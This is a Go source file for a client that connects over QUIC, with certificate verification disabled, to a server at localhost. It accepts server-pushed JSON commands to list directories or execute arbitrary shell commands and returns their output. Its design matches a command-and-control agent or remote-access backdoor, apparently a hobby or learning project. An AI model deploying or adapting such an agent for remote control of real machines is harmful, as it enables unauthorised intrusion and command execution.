package main

import (
	"bufio"
	"client/commands"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"log"
	"time"

	quic "github.com/quic-go/quic-go"
)

const addr = "localhost:4242"

type Command struct {
	Action string   `json:"action"`
	Args   []string `json:"args"`
}

func main() {
	err := clientMain()
	if err != nil {
		log.Fatal(err)
	}
}

// WHEN CLIENT Cant talk to server, he pings it until its back online

func clientMain() error {
	quicConfig := &quic.Config{MaxIdleTimeout: 120 * time.Hour}
	tlsConf := &tls.Config{InsecureSkipVerify: true, NextProtos: []string{"h3-29"}}

	conn, err := quic.DialAddr(context.Background(), addr, tlsConf, quicConfig)
	if err != nil {
		return err
	}
	defer conn.CloseWithError(0, "")

	for {
		stream, err := conn.AcceptStream(context.Background()) // wait for server command
		if err != nil {
			return err
		}

		go handleCommandStream(stream)
	}
}

func handleCommandStream(stream *quic.Stream) {
	defer stream.Close()
	scanner := bufio.NewScanner(stream)

	for scanner.Scan() {
		var cmd Command
		if err := json.Unmarshal(scanner.Bytes(), &cmd); err != nil {
			stream.Write([]byte("invalid command\n"))
			continue
		}

		fmt.Println("executing:", cmd)
		var output string
		switch cmd.Action {
		case "list":
			if len(cmd.Args) > 0 {
				output = commands.ListDir(cmd.Args[0])
			} else {
				output = "No directory specified"
			}
		case "exec":
			if len(cmd.Args) > 0 {
				output = commands.Exec(cmd.Args)
			} else {
				output = "No command specified"
			}
		default:
			output = "unknown command"
		}

		fmt.Println("returning:", output)
		stream.Write([]byte(output + "\n"))
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Read error:", err)
	}
}
